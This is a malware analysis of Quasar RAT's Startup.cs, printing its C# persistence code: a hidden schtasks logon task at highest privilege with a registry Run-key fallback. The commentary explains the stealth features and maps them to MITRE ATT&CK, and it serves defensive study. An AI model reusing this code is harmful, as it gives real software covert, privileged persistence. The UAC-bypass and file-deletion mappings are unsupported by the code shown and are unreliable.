# Quasar RAT - Task Scheduler with Fallback

## Metadata
- **Repository**: theZoo-master
- **File Path**: `malware/Source/Original/Win32.QuasarRAT/Win32.QuasarRAT/QuasarRAT/Client/Core/Installation/Startup.cs`
- **Language**: C#
- **Malware Family**: Quasar RAT (Remote Access Trojan)

## Code Snippet

```csharp
using System;
using System.Diagnostics;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Installation
{
    public static class Startup
    {
        public static bool AddToStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                try
                {
                    // *** SCHEDULED TASK CREATION - LINE 18 ***
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                // Fallback to registry if scheduled task fails
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
            else
            {
                // Non-admin: Use registry Run key
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
        }

        public static bool RemoveFromStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                try
                {
                    // *** TASK DELETION - LINE 51 ***
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
            else
            {
                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
        }
    }
}
```

## Analysis

**What it does:**
Quasar RAT implements a robust persistence mechanism with multiple fallback layers. It attempts to create a scheduled task when running as administrator, but falls back to registry Run key if the task creation fails. The RAT also includes clean removal capabilities.

**How it uses Windows Scheduled Tasks (T1053.005):**
- **Task name**: `/tn "[STARTUPKEY]"` - configurable name from settings
- **Schedule**: `/sc ONLOGON` - triggers at user logon
- **Target**: `/tr "[CurrentPath]"` - points to current executable location
- **Privilege**: `/rl HIGHEST` - runs with highest available privileges
- **Force**: `/f` - overwrites existing task
- **Exit code checking**: Validates task creation success via `ExitCode == 0`

**Evasion/Stealth Techniques:**
1. **Graceful degradation**: Three-tier persistence approach:
   - Primary: Scheduled task (if admin)
   - Fallback 1: Registry Run key (if scheduled task fails but still admin)
   - Fallback 2: Registry Run key (if non-admin)
2. **Hidden execution**: `CreateNoWindow = true`
3. **No shell**: `UseShellExecute = false` avoids cmd.exe intermediary
4. **Timeout handling**: 1-second wait limit prevents hanging
5. **Exception handling**: Silently catches errors and continues to fallback
6. **Exit code validation**: Checks for successful execution before returning
7. **Configurable naming**: Uses `Settings.STARTUPKEY` allowing custom, benign-looking names

**Professional Design Features:**
1. **Return value validation**: Functions return bool indicating success/failure
2. **Clean code structure**: Separate functions for add/remove operations
3. **Proper error handling**: Doesn't crash on failures, attempts alternatives
4. **Helper class usage**: Uses `RegistryKeyHelper` for registry operations
5. **Cleanup capability**: Includes full removal functionality in `RemoveFromStartup()`

**Operational Advantages:**
- **Reliability**: Multiple persistence mechanisms ensure survival across different environments
- **Privilege awareness**: Automatically adapts to available privileges
- **Stealth**: Direct process execution without cmd.exe reduces detection surface
- **Maintenance**: Can cleanly remove itself during cleanup operations

**Comparison to Other RATs:**
Quasar demonstrates more mature engineering than many other RATs:
- Proper boolean return values for error checking
- Multiple fallback mechanisms
- Clean removal capability
- Better exception handling
- More professional code structure

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary for admin)
- **T1547.001**: Boot or Logon Autostart Execution: Registry Run Keys (Fallback)
- **T1548.002**: Abuse Elevation Control Mechanism: Bypass User Account Control
- **T1070.004**: Indicator Removal on Host: File Deletion (removal capability)
- **T1564.003**: Hide Artifacts: Hidden Window
